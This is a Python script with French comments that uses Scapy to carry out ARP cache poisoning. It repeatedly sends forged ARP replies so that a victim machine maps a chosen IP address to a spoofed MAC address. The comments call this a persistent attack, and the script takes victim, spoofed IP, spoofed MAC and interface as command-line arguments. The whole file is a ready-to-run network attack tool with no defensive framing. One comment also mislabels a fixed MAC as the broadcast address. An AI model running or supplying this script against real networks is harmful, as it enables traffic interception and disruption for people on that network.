from scapy.all import *
import sys

def arp_poison(victim_ip, fake_ip, fake_mac, iface):
    """
    Injecte de fausses données dans la table ARP de la victime.

    Args:
        victim_ip (str): Adresse IP de la victime.
        fake_ip (str): Adresse IP que vous voulez associer à l'adresse MAC spoofée.
        fake_mac (str): Adresse MAC spoofée à associer.
        iface (str): Interface réseau à utiliser.
    """
    try:
        # Création du paquet ARP falsifié
        arp_response = ARP(
            op=2,  # 'is-at' (Réponse ARP)
            pdst=victim_ip,  # Adresse IP de la victime
            hwdst="00:50:79:66:68:03",  # Adresse MAC de diffusion
            psrc=fake_ip,  # Adresse IP falsifiée
            hwsrc=fake_mac,  # Adresse MAC falsifiée
            
        )

        print(f"Injection ARP : {fake_ip} -> {fake_mac} pour {victim_ip}")

        # Boucle pour envoyer le paquet en continu (attaque persistante)
        while True:
            send(arp_response, iface=iface, verbose=0)
            print(f"Paquet envoyé : {fake_ip} -> {fake_mac} pour {victim_ip}")
            time.sleep(10)  # Pause pour éviter de saturer le réseau

    except KeyboardInterrupt:
        print("\nArrêt de l'attaque ARP.")
        sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage : python3 arp_poisoning.py <IP_victime> <IP_falsifiée> <MAC_falsifiée> <interface>")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    fake_ip = sys.argv[2]
    fake_mac = sys.argv[3]
    iface = sys.argv[4]

    arp_poison(victim_ip, fake_ip, fake_mac, iface)

